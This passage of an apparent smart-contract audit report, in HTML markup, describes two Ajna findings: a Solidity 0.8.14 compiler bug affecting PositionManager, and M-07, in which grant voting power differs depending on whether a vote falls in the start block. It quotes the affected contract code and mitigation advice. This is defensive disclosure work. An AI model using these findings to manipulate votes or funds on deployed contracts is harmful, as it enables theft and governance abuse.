href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L484\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L484</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPositionIndexesFiltered</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">filteredIndexes_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        …</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// resize array</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> { </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">filteredIndexes_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">filteredIndexesLength</span><span class=\"mtk1\">) }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Unfortunately, <code>PositionManager</code> uses solidity 0.8.14 which would suffer from the bug.<br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L3\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L3</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.14;</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Update the solidity version to 0.8.15</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/306#issuecomment-1555128790\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-07-calling-standardfundingscreeningvote-function-and-extraordinaryfundingvoteextraordinary-function-when-blocknumber-equals-respective-start-block-and-when-blocknumber-is-bigger-than-respective-start-block-can-result-in-different-available-votes-for-same-voter\" style=\"position:relative;\"><a href=\"#m-07-calling-standardfundingscreeningvote-function-and-extraordinaryfundingvoteextraordinary-function-when-blocknumber-equals-respective-start-block-and-when-blocknumber-is-bigger-than-respective-start-block-can-result-in-different-available-votes-for-same-voter\" aria-label=\"m 07 calling standardfundingscreeningvote function and extraordinaryfundingvoteextraordinary function when blocknumber equals respective start block and when blocknumber is bigger than respective start block can result in different available votes for same voter permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288\">[M-07] Calling <code>StandardFunding.screeningVote</code> function and <code>ExtraordinaryFunding.voteExtraordinary</code> function when <code>block.number</code> equals respective start block and when <code>block.number</code> is bigger than respective start block can result in different available votes for same voter</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/355\">deadrxsezzz</a> and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/168\">rvierdiiev</a></em></p>\n<p>Because of <code>if (block.number &#x3C;= screeningStageEndBlock || block.number > endBlock) revert InvalidVote()</code>, the following <code>StandardFunding.fundingVote</code> function can only execute <code>uint128 newVotingPower = SafeCast.toUint128(_getVotesFunding(msg.sender, votingPower, voter.remainingVotingPower, screeningStageEndBlock))</code> when <code>block.number</code> is bigger than <code>screeningStageEndBlock</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fundingVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">FundingVoteParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistributionId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_currentDistributionId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">currentDistributionId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuadraticVoter</span><span class=\"mtk1\">        </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter</span><span class=\"mtk1\">               = </span><span class=\"mtk12\">_quadraticVoters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">currentDistributionId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">screeningStageEndBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getScreeningStageEndBlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that the funding stage is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">screeningStageEndBlock</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if this is the first time a voter has attempted to vote this period,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set initial voting power and remaining voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// calculate the voting power available to the voting power in this funding stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_getVotesFunding</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">remainingVotingPower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">screeningStageEndBlock</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">voter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">          = </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">voter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">remainingVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>When the <code>StandardFunding.fundingVote</code> function calls the following <code>StandardFunding._getVotesFunding</code> function, <code>screeningStageEndBlock</code> would be used as the <code>voteStartBlock_</code> input for calling the <code>Funding._getVotesAtSnapshotBlocks</code> function below. Because <code>block.number</code> would always be bigger than <code>screeningStageEndBlock</code>, <code>voteStartBlock_</code> would always be <code>screeningStageEndBlock</code> in the <code>Funding._getVotesAtSnapshotBlocks</code> function. This means that the <code>Funding._getVotesAtSnapshotBlocks</code> function would always return the same voting power for the same voter at any <code>block.number</code> that is bigger than <code>screeningStageEndBlock</code> during the funding phase.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L891-L910\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L891-L910</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getVotesFunding</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remainingVotingPower_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">screeningStageEndBlock_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voter has already allocated some of their budget this period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPower_</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">remainingVotingPower_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voter hasn&#39;t yet called _castVote in this period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wpow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_getVotesAtSnapshotBlocks</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">screeningStageEndBlock_</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">VOTING_POWER_SNAPSHOT_DELAY</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">screeningStageEndBlock_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ), </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L76-L93\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L76-L93</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getVotesAtSnapshotBlocks</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">snapshot_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteStartBlock_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IVotes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ajnaTokenAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the number of votes available at the snapshot block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPastVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">snapshot_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// enable voting weight to be calculated during the voting period&#39;s start block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">voteStartBlock_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voteStartBlock_</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">voteStartBlock_</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the number of votes available at the stage&#39;s start block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPastVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voteStartBlock_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">min</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votes2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votes1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>However, because of <code>if (block.number &#x3C; currentDistribution.startBlock || block.number > _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote()</code>, calling the following <code>StandardFunding.screeningVote</code> function would not revert when <code>block.number</code> equals the current distribution period’s start block.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L596\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L596</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">screeningVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ScreeningVoteParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_currentDistributionId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check screening stage is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_getScreeningStageEndBlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numVotesCast</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numVotesCast</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check that the proposal is part of the current distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span 